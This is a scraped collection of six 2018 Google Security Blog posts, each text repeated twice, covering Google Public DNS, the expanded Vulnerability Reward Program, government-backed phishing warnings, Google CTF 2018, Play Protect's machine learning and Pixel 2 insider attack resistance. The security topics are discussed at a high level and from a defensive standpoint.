{"website": "Google-Security", "title": "\nGoogle Public DNS turns 8.8.8.8 years old\n", "author": ["Posted by Alexander Dupuy, Software Engineer"], "link": "https://security.googleblog.com/2018/08/google-public-dns-turns-8888-years-old.html", "abstract": "                             Posted by Alexander Dupuy, Software Engineer     Once upon a time, we  launched Google Public DNS , which you might know by its iconic IP address, 8.8.8.8. (Sunday, August 12th, 2018, at 00:30 UTC marks eight years, eight months, eight days and eight hours since the announcement.) Though not as well-known as Google Search or Gmail, the four eights have had quite a journey&#8212;and some pretty amazing growth! Whether it&#8217;s  travelers in India&#8217;s train stations  or  researchers on the remote Antarctic island Bouvetøya , hundreds of millions of people the world over rely on our free DNS service to turn domain names like wikipedia.org into IP addresses like 208.80.154.224.               Google Public DNS query growth and major feature launches       Today, it&#8217;s estimated that about  10% of internet users  rely on 8.8.8.8, and it serves well over a trillion queries per day. But while we&#8217;re really proud of that growth, what really matters is whether it&#8217;s a valuable service for our users. Namely, has Google Public DNS made the internet faster for users? Does it safeguard their privacy? And does it help them get to internet sites more reliably and securely?    In other words, has 8.8.8.8 made DNS and the internet better as a whole? Here at Google, we think it has. On this numerological anniversary, let&#8217;s take a look at how Google Public DNS has realized those goals and what lies ahead.   Making the internet faster     From the start, a key goal of Google Public DNS was to  make the internet faster . When we began the project in 2007, Google had already made it faster to search the web, but it could take a while to get to your destination. Back then, most DNS lookups used your ISP&#8217;s resolvers, and with small caches, they often had to make multiple DNS queries before they could return an address.    Google Public DNS resolvers&#8217; DNS caches hold tens of billions of entries worldwide. And because hundreds of millions of clients use them every day, they usually return the address for your domain queries without extra lookups, connecting you to the internet that much faster.               DNS resolution process for example.org       Speeding up DNS responses is just one part of making the web faster&#8212;getting web content from servers closer to you can have an even bigger impact. Content Delivery Networks (CDNs) distribute large, delay-sensitive content like streaming videos to users around the world. CDNs use DNS to direct users to the nearest servers, and rely on  GeoIP maps  to determine the best location.    Everything&#8217;s good if your DNS query comes from an ISP resolver that is close to you, but what happens if the resolver is far away, as it is for researchers on Bouvetøya? In that case, the CDN directs you to a server near the DNS resolver&#8212;but not the one closest to you. In 2010, along with other DNS and CDN services, we  proposed a solution  that lets DNS resolvers send part of your IP address in their DNS queries, so CDN name servers can get your best possible GeoIP location (short of sending your entire IP address). By sending only the first three parts of users&#8217; IP addresses (e.g. 192.0.2.x) in the EDNS Client Subnet (ECS) extension, CDNs can return the closest content while maintaining user privacy.    We continue to enhance ECS, (now published as  RFC 7871 ), for example, by adding  automatic detection of name server ECS support . And today, we&#8217;re happy to report, support for ECS is widespread among CDNs.     Safeguarding user privacy       From day one of our service, we&#8217;ve always been serious about user privacy. Like all Google services, we honor the general Google  Privacy Policy , and are guided by Google&#8217;s  Privacy Principles . In addition, Google Public DNS published a  privacy practice statement  about the information we collect and how it is used&#8212;and how it&#8217;s not used. These protect the privacy of your DNS queries once they arrive at Google, but they can still be seen (and potentially modified) en route to 8.8.8.8.    To address this weakness, we  launched a public beta  of  DNS-over-HTTPS  on April 1, 2016, embedding your DNS queries in the secure and private HTTPS protocol. Despite the launch date, this was not an April Fool&#8217;s joke, and in the following two years, it has grown dramatically, with millions of users and support by another major public DNS service. Today, we are working in the IETF and with other DNS operators and clients on the  Internet Draft for DNS Queries over HTTPS  specification, which we also support.     Securing the Domain Name System     We&#8217;ve always been very concerned with the integrity and security of the responses that Google Public DNS provides. From the start, we  rejected  the practice of  hijacking nonexistent domain (NXDOMAIN) responses , working to provide users with accurate and honest DNS responses, even when attackers tried to corrupt them.    In 2008, Dan Kaminsky publicized a major security weakness in the DNS protocol that left most DNS resolvers vulnerable to spoofing that poisoned their DNS caches. When we launched 8.8.8.8 the following year, we not only used industry best practices to mitigate this vulnerability, but also developed an  extensive set of additional protections .    While those protected our DNS service from most attackers, they can&#8217;t help in cases where an attacker can see our queries. Starting in 2010, the internet started to use  DNSSEC security  in earnest, making it possible to protect cryptographically signed domains against such  man-in-the-middle  and  man-on-the-side  attacks. In 2013, Google Public DNS became the first major public DNS resolver to  implement DNSSEC validation  for all its DNS queries,  doubling the percentage of end users protected by DNSSEC from 3.3% to 8.1% .    In addition to protecting the integrity of DNS responses, Google Public DNS also works to block DNS denial of service attacks by  rate limiting  both our queries to name servers and  reflection or amplification attacks  that try to flood victims&#8217; network connections.     Internet access for all       A big part of Google Public DNS&#8217;s tremendous growth comes from free public internet services. We make the internet faster for hundreds of these services, from free WiFi in San Francisco&#8217;s parks to LinkNYC internet kiosk hotspots and the  Railtel partnership in India&#8216;s train stations . In places like Africa and Southeast Asia, many ISPs also use 8.8.8.8 to resolve their users&#8217; DNS queries. Providing free DNS resolution to anyone in the world, even to other companies, supports internet access worldwide as a part of Google&#8217;s  Next Billion Users initiative .                  APNIC Labs  map of worldwide usage ( Interactive Map )        Looking ahead       Today, Google Public DNS is the largest public DNS resolver. There are now about a dozen such services providing value-added features like content and malware filtering, and recent entrants Quad9 and Cloudflare also provide privacy for DNS queries over TLS or HTTPS.    But recent incidents that used BGP hijacking to attack DNS are concerning. Increasing the adoption and use of DNSSEC is an effective way to protect against such attacks and as the largest DNSSEC validating resolver, we hope we can influence things in that direction. We are also exploring how to improve the security of the path from resolvers to authoritative name servers&#8212;issues not currently addressed by other DNS standards.    In short, we continue to improve Google Public DNS both behind the scenes and in ways visible to users, adding features that users want from their DNS service. Stay tuned for some exciting Google Public DNS announcements in the near future!                                   Posted by Alexander Dupuy, Software Engineer  Once upon a time, we launched Google Public DNS, which you might know by its iconic IP address, 8.8.8.8. (Sunday, August 12th, 2018, at 00:30 UTC marks eight years, eight months, eight days and eight hours since the announcement.) Though not as well-known as Google Search or Gmail, the four eights have had quite a journey—and some pretty amazing growth! Whether it’s travelers in India’s train stations or researchers on the remote Antarctic island Bouvetøya, hundreds of millions of people the world over rely on our free DNS service to turn domain names like wikipedia.org into IP addresses like 208.80.154.224.   Google Public DNS query growth and major feature launches  Today, it’s estimated that about 10% of internet users rely on 8.8.8.8, and it serves well over a trillion queries per day. But while we’re really proud of that growth, what really matters is whether it’s a valuable service for our users. Namely, has Google Public DNS made the internet faster for users? Does it safeguard their privacy? And does it help them get to internet sites more reliably and securely?  In other words, has 8.8.8.8 made DNS and the internet better as a whole? Here at Google, we think it has. On this numerological anniversary, let’s take a look at how Google Public DNS has realized those goals and what lies ahead. Making the internet faster  From the start, a key goal of Google Public DNS was to make the internet faster. When we began the project in 2007, Google had already made it faster to search the web, but it could take a while to get to your destination. Back then, most DNS lookups used your ISP’s resolvers, and with small caches, they often had to make multiple DNS queries before they could return an address.  Google Public DNS resolvers’ DNS caches hold tens of billions of entries worldwide. And because hundreds of millions of clients use them every day, they usually return the address for your domain queries without extra lookups, connecting you to the internet that much faster.   DNS resolution process for example.org  Speeding up DNS responses is just one part of making the web faster—getting web content from servers closer to you can have an even bigger impact. Content Delivery Networks (CDNs) distribute large, delay-sensitive content like streaming videos to users around the world. CDNs use DNS to direct users to the nearest servers, and rely on GeoIP maps to determine the best location.  Everything’s good if your DNS query comes from an ISP resolver that is close to you, but what happens if the resolver is far away, as it is for researchers on Bouvetøya? In that case, the CDN directs you to a server near the DNS resolver—but not the one closest to you. In 2010, along with other DNS and CDN services, we proposed a solution that lets DNS resolvers send part of your IP address in their DNS queries, so CDN name servers can get your best possible GeoIP location (short of sending your entire IP address). By sending only the first three parts of users’ IP addresses (e.g. 192.0.2.x) in the EDNS Client Subnet (ECS) extension, CDNs can return the closest content while maintaining user privacy.  We continue to enhance ECS, (now published as RFC 7871), for example, by adding automatic detection of name server ECS support. And today, we’re happy to report, support for ECS is widespread among CDNs.  Safeguarding user privacy  From day one of our service, we’ve always been serious about user privacy. Like all Google services, we honor the general Google Privacy Policy, and are guided by Google’s Privacy Principles. In addition, Google Public DNS published a privacy practice statement about the information we collect and how it is used—and how it’s not used. These protect the privacy of your DNS queries once they arrive at Google, but they can still be seen (and potentially modified) en route to 8.8.8.8.  To address this weakness, we launched a public beta of DNS-over-HTTPS on April 1, 2016, embedding your DNS queries in the secure and private HTTPS protocol. Despite the launch date, this was not an April Fool’s joke, and in the following two years, it has grown dramatically, with millions of users and support by another major public DNS service. Today, we are working in the IETF and with other DNS operators and clients on the Internet Draft for DNS Queries over HTTPS specification, which we also support.  Securing the Domain Name System  We’ve always been very concerned with the integrity and security of the responses that Google Public DNS provides. From the start, we rejected the practice of hijacking nonexistent domain (NXDOMAIN) responses, working to provide users with accurate and honest DNS responses, even when attackers tried to corrupt them.  In 2008, Dan Kaminsky publicized a major security weakness in the DNS protocol that left most DNS resolvers vulnerable to spoofing that poisoned their DNS caches. When we launched 8.8.8.8 the following year, we not only used industry best practices to mitigate this vulnerability, but also developed an extensive set of additional protections.  While those protected our DNS service from most attackers, they can’t help in cases where an attacker can see our queries. Starting in 2010, the internet started to use DNSSEC security in earnest, making it possible to protect cryptographically signed domains against such man-in-the-middle and man-on-the-side attacks. In 2013, Google Public DNS became the first major public DNS resolver to implement DNSSEC validation for all its DNS queries, doubling the percentage of end users protected by DNSSEC from 3.3% to 8.1%.  In addition to protecting the integrity of DNS responses, Google Public DNS also works to block DNS denial of service attacks by rate limiting both our queries to name servers and reflection or amplification attacks that try to flood victims’ network connections.  Internet access for all  A big part of Google Public DNS’s tremendous growth comes from free public internet services. We make the internet faster for hundreds of these services, from free WiFi in San Francisco’s parks to LinkNYC internet kiosk hotspots and the Railtel partnership in India‘s train stations. In places like Africa and Southeast Asia, many ISPs also use 8.8.8.8 to resolve their users’ DNS queries. Providing free DNS resolution to anyone in the world, even to other companies, supports internet access worldwide as a part of Google’s Next Billion Users initiative.    APNIC Labs map of worldwide usage (Interactive Map)  Looking ahead  Today, Google Public DNS is the largest public DNS resolver. There are now about a dozen such services providing value-added features like content and malware filtering, and recent entrants Quad9 and Cloudflare also provide privacy for DNS queries over TLS or HTTPS.  But recent incidents that used BGP hijacking to attack DNS are concerning. Increasing the adoption and use of DNSSEC is an effective way to protect against such attacks and as the largest DNSSEC validating resolver, we hope we can influence things in that direction. We are also exploring how to improve the security of the path from resolvers to authoritative name servers—issues not currently addressed by other DNS standards.  In short, we continue to improve Google Public DNS both behind the scenes and in ways visible to users, adding features that users want from their DNS service. Stay tuned for some exciting Google Public DNS announcements in the near future!     ", "date": "August 10, 2018"},
{"website": "Google-Security", "title": "\nExpanding our Vulnerability Reward Program to combat platform abuse\n", "author": ["Posted by Eric Brown and Marc Henson, Trust & Safety"], "link": "https://security.googleblog.com/2018/08/expanding-our-vulnerability-reward.html", "abstract": "                             Posted by Eric Brown and Marc Henson, Trust &amp; Safety     Since 2010, Google&#8217;s Vulnerability Reward Programs have  awarded more than $12 million dollars  to researchers and created a  thriving Google-focused security community . For the past two years, some of these rewards were for bug reports that were not strictly security vulnerabilities, but techniques that allow third parties to successfully bypass our abuse, fraud, and spam systems.    Today, we are expanding our Vulnerability Reward Program to formally invite researchers to submit these reports.    This expansion is intended to reward research that helps us mitigate potential abuse methods. A few examples of potentially valid reports for this program could include bypassing our account recovery systems at scale, identifying services vulnerable to brute force attacks, circumventing restrictions on content use and sharing, or purchasing items from Google without paying. Valid reports tend to result in changes to the product&#8217;s code, as opposed to removal of individual pieces of content.    This program does not cover individual instances of abuse, such as the posting of content that violates our guidelines or policies, sending spam emails, or providing links to malware. These should continue to be reported through existing product-specific channels, such as for  Google+ ,  YouTube ,  Gmail , and  Blogger .    Reports submitted to our Vulnerability Reward Program that outline abuse methods are reviewed by experts on our Trust &amp; Safety team, which specializes in the prevention and mitigation of abuse, fraud, and spam activity on our products.    We greatly value our relationship with the research community, and we&#8217;re excited to expand on it to help make the internet a safer place for everyone. To learn more, see our  updated rules .    Happy hunting!                                   Posted by Eric Brown and Marc Henson, Trust & Safety  Since 2010, Google’s Vulnerability Reward Programs have awarded more than $12 million dollars to researchers and created a thriving Google-focused security community. For the past two years, some of these rewards were for bug reports that were not strictly security vulnerabilities, but techniques that allow third parties to successfully bypass our abuse, fraud, and spam systems.  Today, we are expanding our Vulnerability Reward Program to formally invite researchers to submit these reports.  This expansion is intended to reward research that helps us mitigate potential abuse methods. A few examples of potentially valid reports for this program could include bypassing our account recovery systems at scale, identifying services vulnerable to brute force attacks, circumventing restrictions on content use and sharing, or purchasing items from Google without paying. Valid reports tend to result in changes to the product’s code, as opposed to removal of individual pieces of content.  This program does not cover individual instances of abuse, such as the posting of content that violates our guidelines or policies, sending spam emails, or providing links to malware. These should continue to be reported through existing product-specific channels, such as for Google+, YouTube, Gmail, and Blogger.  Reports submitted to our Vulnerability Reward Program that outline abuse methods are reviewed by experts on our Trust & Safety team, which specializes in the prevention and mitigation of abuse, fraud, and spam activity on our products.  We greatly value our relationship with the research community, and we’re excited to expand on it to help make the internet a safer place for everyone. To learn more, see our updated rules.  Happy hunting!     ", "date": "August 15, 2018"},
{"website": "Google-Security", "title": "\nA reminder about government-backed phishing\n", "author": ["Posted by Shane Huntley, Threat Analysis Group"], "link": "https://security.googleblog.com/2018/08/a-reminder-about-government-backed.html", "abstract": "                             Posted by Shane Huntley, Threat Analysis Group      TLDR: Government-backed phishing has been in the news lately. If you receive a warning in Gmail, be sure to take prompt action. Get two-factor authentication on your account. And consider enrolling in the  Advanced Protection Program .     One of the main threats to all email users (whatever service you use) is phishing, attempts to trick you into providing a password that an attacker can use to sign into your account. Our &#8203;improving &#8203;technology has enabled &#8203;us to &#8203; significantly &#8203;decrease &#8203;the &#8203;volume &#8203;of &#8203;phishing &#8203;emails that &#8203;get &#8203;through  to our users. &#8203; Automated &#8203;protections, &#8203;account &#8203;security &#8203;(like &#8203;security &#8203;keys), &#8203;and specialized &#8203;warnings give &#8203;Gmail users industry-leading &#8203;security.    Beyond phishing for the purposes of fraud, a small minority of users in all corners of the world are still targeted by sophisticated government-backed attackers. These attempts come from dozens of countries.  Since 2012 , we've shown prominent warnings within Gmail notifying users that they may be targets of these types of phishing attempts; we show thousands of these warnings every month, even if we have blocked the specific attempt.    We also send  alerts to G Suite administrators  if someone in their corporate network may have been the target of government-backed phishing. And we regularly  post public advisories  to make sure that people are aware of this risk.    This is what an account warning looks like; an extremely small fraction of users will ever see one of these, but if you receive this warning from us, it's important to  take immediate action on it .                 We intentionally send these notices in batches to all users who may be at risk, rather than at the moment we detect the threat itself, so that attackers cannot track some of our defense strategies. We have an expert team in our Threat Analysis Group, and we use a variety of technologies to detect these attempts. We also notify law enforcement about what we&#8217;re seeing; they have additional tools to investigate these attacks.    We hope you never receive this type of warning, but if you do, please take action right away to enhance the security of your accounts.    Even if you don&#8217;t receive such a warning, you should  enable 2-step verification in Gmail . And if you think you&#8217;re at particular risk of government-backed phishing, consider enrolling in the  Advanced Protection Program , which provides even stronger levels of security.                                   Posted by Shane Huntley, Threat Analysis Group  TLDR: Government-backed phishing has been in the news lately. If you receive a warning in Gmail, be sure to take prompt action. Get two-factor authentication on your account. And consider enrolling in the Advanced Protection Program.  One of the main threats to all email users (whatever service you use) is phishing, attempts to trick you into providing a password that an attacker can use to sign into your account. Our ​improving ​technology has enabled ​us to ​significantly ​decrease ​the ​volume ​of ​phishing ​emails that ​get ​through to our users. ​ Automated ​protections, ​account ​security ​(like ​security ​keys), ​and specialized ​warnings give ​Gmail users industry-leading ​security.  Beyond phishing for the purposes of fraud, a small minority of users in all corners of the world are still targeted by sophisticated government-backed attackers. These attempts come from dozens of countries. Since 2012, we've shown prominent warnings within Gmail notifying users that they may be targets of these types of phishing attempts; we show thousands of these warnings every month, even if we have blocked the specific attempt.  We also send alerts to G Suite administrators if someone in their corporate network may have been the target of government-backed phishing. And we regularly post public advisories to make sure that people are aware of this risk.  This is what an account warning looks like; an extremely small fraction of users will ever see one of these, but if you receive this warning from us, it's important to take immediate action on it.       We intentionally send these notices in batches to all users who may be at risk, rather than at the moment we detect the threat itself, so that attackers cannot track some of our defense strategies. We have an expert team in our Threat Analysis Group, and we use a variety of technologies to detect these attempts. We also notify law enforcement about what we’re seeing; they have additional tools to investigate these attacks.  We hope you never receive this type of warning, but if you do, please take action right away to enhance the security of your accounts.  Even if you don’t receive such a warning, you should enable 2-step verification in Gmail. And if you think you’re at particular risk of government-backed phishing, consider enrolling in the Advanced Protection Program, which provides even stronger levels of security.     ", "date": "August 20, 2018"},
{"website": "Google-Security", "title": "\n Google CTF 2018 is here\n", "author": ["Posted by Jan Keller, Security TPM"], "link": "https://security.googleblog.com/2018/05/google-ctf-2018-is-here.html", "abstract": "                             Posted by Jan Keller, Security TPM    Google CTF 2017  was a big success! We had over 5,000 players, nearly 2,000 teams captured flags, we paid $31,1337.00, and most importantly: you had fun playing and we had fun hosting!                Congratulations (for the second year) to the team pasten, from Israel, for scoring first place in both the quals and the finals. Also, for everyone who hasn&#8217;t played yet or wants to play again, we have open-sourced the 2017 challenges in our GitHub  repository .             Hence, we are excited to announce Google CTF 2018:       Date and time: 00:00:01 UTC on June 23th and 24th, 2018   Location:&nbsp; Online    Prizes:&nbsp; Big checks , swag and rewards for creative&nbsp; write-ups       The winning teams will compete again for a spot at the Google CTF Finals later this year (more details on the Finals soon).                 For beginners and veterans alike          Based on the feedback we received, we plan to have additional challenges this year where people that may be new to CTFs or security can learn about, and try their hands at, some security challenges. These will be presented in a &#8220;Quest&#8221; style where there will be a scenario similar to a real world penetration testing environment. We hope that this will give people a chance to sharpen their skills, learn something new about CTFs and security, while allowing them to see a real world value to information security and its broader impact.         We hope to virtually see you at the 3rd annual Google CTF on June 23rd 2018 at 00:00:01 UTC. Check  g.co/ctf , or  subscribe to our mailing list  for more details, as they become available.            Why do we host these competitions?          We outlined our&nbsp; philosophy &nbsp;last year, but in short: we believe that the security community helps us better protect Google users, and so we want to nurture the community and give back in a fun way.          Thirsty for more?          There are a lot of opportunities for you to help us make the Internet a safer place:       Our  Vulnerability Rewards Program : Report vulnerabilities in our infrastructure and get rewarded   ( AutoFuzz )  Patch Rewards Program : Fix vulnerabilities in open-source software to build your reputation and make an impact in the security community    Vulnerability Research Grants Program : Apply for a research grant to extensively test a component of our infrastructure at your own pace.                                         Posted by Jan Keller, Security TPM Google CTF 2017 was a big success! We had over 5,000 players, nearly 2,000 teams captured flags, we paid $31,1337.00, and most importantly: you had fun playing and we had fun hosting!      Congratulations (for the second year) to the team pasten, from Israel, for scoring first place in both the quals and the finals. Also, for everyone who hasn’t played yet or wants to play again, we have open-sourced the 2017 challenges in our GitHub repository.     Hence, we are excited to announce Google CTF 2018:   Date and time: 00:00:01 UTC on June 23th and 24th, 2018 Location: Online Prizes: Big checks, swag and rewards for creative write-ups   The winning teams will compete again for a spot at the Google CTF Finals later this year (more details on the Finals soon).       For beginners and veterans alike    Based on the feedback we received, we plan to have additional challenges this year where people that may be new to CTFs or security can learn about, and try their hands at, some security challenges. These will be presented in a “Quest” style where there will be a scenario similar to a real world penetration testing environment. We hope that this will give people a chance to sharpen their skills, learn something new about CTFs and security, while allowing them to see a real world value to information security and its broader impact.    We hope to virtually see you at the 3rd annual Google CTF on June 23rd 2018 at 00:00:01 UTC. Check g.co/ctf, or subscribe to our mailing list for more details, as they become available.    Why do we host these competitions?    We outlined our philosophy last year, but in short: we believe that the security community helps us better protect Google users, and so we want to nurture the community and give back in a fun way.    Thirsty for more?    There are a lot of opportunities for you to help us make the Internet a safer place:   Our Vulnerability Rewards Program: Report vulnerabilities in our infrastructure and get rewarded (AutoFuzz) Patch Rewards Program: Fix vulnerabilities in open-source software to build your reputation and make an impact in the security community Vulnerability Research Grants Program: Apply for a research grant to extensively test a component of our infrastructure at your own pace.       ", "date": "May 8, 2018"},
{"website": "Google-Security", "title": "\nKeeping 2 billion Android devices safe with machine learning\n", "author": [], "link": "https://security.googleblog.com/2018/05/keeping-2-billion-android-devices-safe.html", "abstract": "                                   Posted by Sai Deep Tetali, Software Engineer, Google Play Protect    [Cross-posted from the  Android Developers Blog ]     At Google I/O 2017, we introduced  Google Play Protect , our comprehensive set of security services for Android. While the name is new, the smarts powering Play Protect have protected Android users for years.   Google Play Protect's suite of mobile threat protections are built into more than 2 billion Android devices, automatically taking action in the background. We're constantly updating these protections so you don't have to think about security: it just happens. Our protections have been made even smarter by adding machine learning elements to Google Play Protect.     Security at scale           Google Play Protect provides in-the-moment protection from potentially harmful apps (PHAs), but Google's protections start earlier.    Before they're published in Google Play, all apps are rigorously analyzed by our security systems and Android security experts. Thanks to this process, Android devices that only download apps from Google Play are 9 times less likely to get a PHA than devices that download apps from other sources.    After you install an app, Google Play Protect continues its quest to keep your device safe by regularly scanning your device to make sure all apps are behaving properly. If it finds an app that is misbehaving, Google Play Protect either notifies you, or simply removes the harmful app to keep your device safe.     Our systems scan over 50 billion apps every day. To keep on the cutting edge of security, we look for new risks in a variety of ways, such as identifying specific code paths that signify bad behavior, investigating behavior patterns to correlate bad apps, and reviewing possible PHAs with our security experts.    In 2016, we added machine learning as a new detection mechanism and it soon became a critical part of our systems and tools.     Training our machines          In the most basic terms, machine learning means training a computer algorithm to recognize a behavior. To train the algorithm, we give it hundreds of thousands of examples of that behavior.    In the case of Google Play Protect, we are developing algorithms that learn which apps are \"potentially harmful\" and which are \"safe.\" To learn about PHAs, the machine learning algorithms analyze our entire catalog of applications. Then our algorithms look at hundreds of signals combined with anonymized data to compare app behavior across the Android ecosystem to find PHAs. They look for behavior common to PHAs, such as apps that attempt to interact with other apps on the device, access or share your personal data, download something without your knowledge, connect to phishing websites, or bypass built-in security features.   When we find apps exhibit similar  malicious behavior , we group them into families. Visualizing these PHA families helps us uncover apps that share similarities to known bad apps, but have yet remained under our radar.          After we identify a new PHA, we confirm our findings with expert security reviews. If the app in question is a PHA, Google Play Protect takes action on the app and then we feed information about that PHA back into our algorithms to help find more PHAs.     Doubling down on security  So far, our machine learning systems have successfully detected 60.3% of the malware identified by Google Play Protect in 2017.   In 2018, we're devoting a massive amount of computing power and talent to create, maintain and improve these machine learning algorithms. We're constantly leveraging artificial intelligence and our highly skilled researchers and engineers from all across Google to find new ways to keep Android devices safe and secure. In addition to our talented team, we work with the foremost  security experts and researchers  from around the world. These researchers contribute even more data and insights to keep Google Play Protect on the cutting edge of mobile security.   To check out Google Play Protect, open the Google Play app and tap  Play Protect  in the left panel.    Acknowledgements: This work was developed in joint collaboration with Google Play Protect, Safe Browsing and Play Abuse teams with contributions from Andrew Ahn, Hrishikesh Aradhye, Daniel Bali, Hongji Bao, Yajie Hu, Arthur Kaiser, Elena Kovakina, Salvador Mandujano, Melinda Miller, Rahul Mishra, Damien Octeau, Sebastian Porst, Chuangang Ren, Monirul Sharif, Sri Somanchi, Sai Deep Tetali, Zhikun Wang, and Mo Yu.                                          Posted by Sai Deep Tetali, Software Engineer, Google Play Protect [Cross-posted from the Android Developers Blog]  At Google I/O 2017, we introduced Google Play Protect, our comprehensive set of security services for Android. While the name is new, the smarts powering Play Protect have protected Android users for years.  Google Play Protect's suite of mobile threat protections are built into more than 2 billion Android devices, automatically taking action in the background. We're constantly updating these protections so you don't have to think about security: it just happens. Our protections have been made even smarter by adding machine learning elements to Google Play Protect.   Security at scale    Google Play Protect provides in-the-moment protection from potentially harmful apps (PHAs), but Google's protections start earlier.   Before they're published in Google Play, all apps are rigorously analyzed by our security systems and Android security experts. Thanks to this process, Android devices that only download apps from Google Play are 9 times less likely to get a PHA than devices that download apps from other sources.   After you install an app, Google Play Protect continues its quest to keep your device safe by regularly scanning your device to make sure all apps are behaving properly. If it finds an app that is misbehaving, Google Play Protect either notifies you, or simply removes the harmful app to keep your device safe.    Our systems scan over 50 billion apps every day. To keep on the cutting edge of security, we look for new risks in a variety of ways, such as identifying specific code paths that signify bad behavior, investigating behavior patterns to correlate bad apps, and reviewing possible PHAs with our security experts.   In 2016, we added machine learning as a new detection mechanism and it soon became a critical part of our systems and tools.   Training our machines     In the most basic terms, machine learning means training a computer algorithm to recognize a behavior. To train the algorithm, we give it hundreds of thousands of examples of that behavior.   In the case of Google Play Protect, we are developing algorithms that learn which apps are \"potentially harmful\" and which are \"safe.\" To learn about PHAs, the machine learning algorithms analyze our entire catalog of applications. Then our algorithms look at hundreds of signals combined with anonymized data to compare app behavior across the Android ecosystem to find PHAs. They look for behavior common to PHAs, such as apps that attempt to interact with other apps on the device, access or share your personal data, download something without your knowledge, connect to phishing websites, or bypass built-in security features.  When we find apps exhibit similar malicious behavior, we group them into families. Visualizing these PHA families helps us uncover apps that share similarities to known bad apps, but have yet remained under our radar.     After we identify a new PHA, we confirm our findings with expert security reviews. If the app in question is a PHA, Google Play Protect takes action on the app and then we feed information about that PHA back into our algorithms to help find more PHAs.   Doubling down on security So far, our machine learning systems have successfully detected 60.3% of the malware identified by Google Play Protect in 2017.  In 2018, we're devoting a massive amount of computing power and talent to create, maintain and improve these machine learning algorithms. We're constantly leveraging artificial intelligence and our highly skilled researchers and engineers from all across Google to find new ways to keep Android devices safe and secure. In addition to our talented team, we work with the foremost security experts and researchers from around the world. These researchers contribute even more data and insights to keep Google Play Protect on the cutting edge of mobile security.  To check out Google Play Protect, open the Google Play app and tap Play Protect in the left panel.  Acknowledgements: This work was developed in joint collaboration with Google Play Protect, Safe Browsing and Play Abuse teams with contributions from Andrew Ahn, Hrishikesh Aradhye, Daniel Bali, Hongji Bao, Yajie Hu, Arthur Kaiser, Elena Kovakina, Salvador Mandujano, Melinda Miller, Rahul Mishra, Damien Octeau, Sebastian Porst, Chuangang Ren, Monirul Sharif, Sri Somanchi, Sai Deep Tetali, Zhikun Wang, and Mo Yu.      ", "date": "May 24, 2018"},
{"website": "Google-Security", "title": "\nInsider attack resistance\n", "author": ["Posted by Shawn Willden, Staff Software Engineer"], "link": "https://security.googleblog.com/2018/06/insider-attack-resistance.html", "abstract": "                             Posted by Shawn Willden, Staff Software Engineer          [Cross-posted from the  Android Developers Blog ]     Our smart devices, such as mobile phones and tablets, contain a wealth of personal information that needs to be kept safe. Google is constantly trying to find new and better ways to protect that valuable information on Android devices. From partnering with  external researchers  to find and fix vulnerabilities, to adding new features to the Android platform, we work to make each release and new device safer than the last. This post talks about Google's strategy for making the encryption on Google Pixel 2 devices resistant to various levels of attack&#8212;from platform, to hardware, all the way to the people who create the signing keys for Pixel devices.     We encrypt all user data on Google Pixel devices and  protect the encryption keys in secure hardware . The secure hardware runs highly secure firmware that is responsible for checking the user's password. If the password is entered incorrectly, the firmware refuses to decrypt the device. This firmware also limits the rate at which passwords can be checked, making it harder for attackers to use a brute force attack.     To prevent attackers from replacing our firmware with a malicious version, we apply digital signatures. There are two ways for an attacker to defeat the signature checks and install a malicious replacement for firmware: find and exploit vulnerabilities in the signature-checking process or gain access to the signing key and get their malicious version signed so the device will accept it as a legitimate update. The signature-checking software is tiny, isolated, and vetted with extreme thoroughness. Defeating it is hard. The signing keys, however, must exist somewhere, and there must be people who have access to them.     In the past, device makers have focused on safeguarding these keys by storing the keys in secure locations and severely restricting the number of people who have access to them. That's good, but it leaves those people open to attack by coercion or social engineering. That's risky for the employees personally, and we believe it creates too much risk for user data.     To mitigate these risks,  Google Pixel 2 devices  implement  insider attack resistance  in the tamper-resistant hardware security module that guards the encryption keys for user data. This helps prevent an attacker who manages to produce properly signed malicious firmware from installing it on the security module in a lost or stolen device without the user's cooperation. Specifically, it is not possible to upgrade the firmware that checks the user's password unless you present the correct user password. There is a way to \"force\" an upgrade, for example when a returned device is refurbished for resale, but forcing it wipes the secrets used to decrypt the user's data, effectively destroying it.   The Android security team believes that insider attack resistance is an important element of a complete strategy for protecting user data. The Google Pixel 2 demonstrated that it's possible to protect users even against the most highly-privileged insiders. We recommend that all mobile device makers do the same. For help, device makers working to implement insider attack resistance can reach out to the Android security team through their Google contact.      Acknowledgements: This post was developed in joint collaboration with Paul Crowley, Senior Software Engineer                                     Posted by Shawn Willden, Staff Software Engineer     [Cross-posted from the Android Developers Blog]  Our smart devices, such as mobile phones and tablets, contain a wealth of personal information that needs to be kept safe. Google is constantly trying to find new and better ways to protect that valuable information on Android devices. From partnering with external researchers to find and fix vulnerabilities, to adding new features to the Android platform, we work to make each release and new device safer than the last. This post talks about Google's strategy for making the encryption on Google Pixel 2 devices resistant to various levels of attack—from platform, to hardware, all the way to the people who create the signing keys for Pixel devices.   We encrypt all user data on Google Pixel devices and protect the encryption keys in secure hardware. The secure hardware runs highly secure firmware that is responsible for checking the user's password. If the password is entered incorrectly, the firmware refuses to decrypt the device. This firmware also limits the rate at which passwords can be checked, making it harder for attackers to use a brute force attack.   To prevent attackers from replacing our firmware with a malicious version, we apply digital signatures. There are two ways for an attacker to defeat the signature checks and install a malicious replacement for firmware: find and exploit vulnerabilities in the signature-checking process or gain access to the signing key and get their malicious version signed so the device will accept it as a legitimate update. The signature-checking software is tiny, isolated, and vetted with extreme thoroughness. Defeating it is hard. The signing keys, however, must exist somewhere, and there must be people who have access to them.   In the past, device makers have focused on safeguarding these keys by storing the keys in secure locations and severely restricting the number of people who have access to them. That's good, but it leaves those people open to attack by coercion or social engineering. That's risky for the employees personally, and we believe it creates too much risk for user data.   To mitigate these risks, Google Pixel 2 devices implement insider attack resistance in the tamper-resistant hardware security module that guards the encryption keys for user data. This helps prevent an attacker who manages to produce properly signed malicious firmware from installing it on the security module in a lost or stolen device without the user's cooperation. Specifically, it is not possible to upgrade the firmware that checks the user's password unless you present the correct user password. There is a way to \"force\" an upgrade, for example when a returned device is refurbished for resale, but forcing it wipes the secrets used to decrypt the user's data, effectively destroying it.  The Android security team believes that insider attack resistance is an important element of a complete strategy for protecting user data. The Google Pixel 2 demonstrated that it's possible to protect users even against the most highly-privileged insiders. We recommend that all mobile device makers do the same. For help, device makers working to implement insider attack resistance can reach out to the Android security team through their Google contact.   Acknowledgements: This post was developed in joint collaboration with Paul Crowley, Senior Software Engineer     ", "date": "June 1, 2018"},
